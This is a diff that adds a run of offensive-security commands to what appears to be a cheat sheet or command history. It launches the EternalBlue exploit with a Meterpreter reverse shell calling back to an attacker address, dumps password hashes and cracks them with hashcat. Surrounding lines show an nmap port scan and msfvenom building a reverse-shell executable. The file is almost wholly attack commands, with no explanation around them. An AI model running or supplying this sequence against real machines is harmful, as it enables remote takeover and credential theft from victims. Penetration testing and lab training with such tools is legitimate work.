@@ -1,3 +1,21 @@
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOST 192.168.1.24
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.5
+set LPORT 4444
+exploit
+sessions -i 1
+run post/windows/gather/hashdump
+search type:exploit name:rdp
+info exploit/windows/http/struts2_code_exec
+hashcat -m 0 -a 0 hashes.txt rockyou.txt
+hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a
+hashcat -b
+hashcat -I
+hashcat --status
+hashcat --restore
+meterpreter > shell
+C:\Windows\System32> dir
 nmap -sS -T4 -p- 10.0.0.42
 msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue"
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f exe > shell.exe
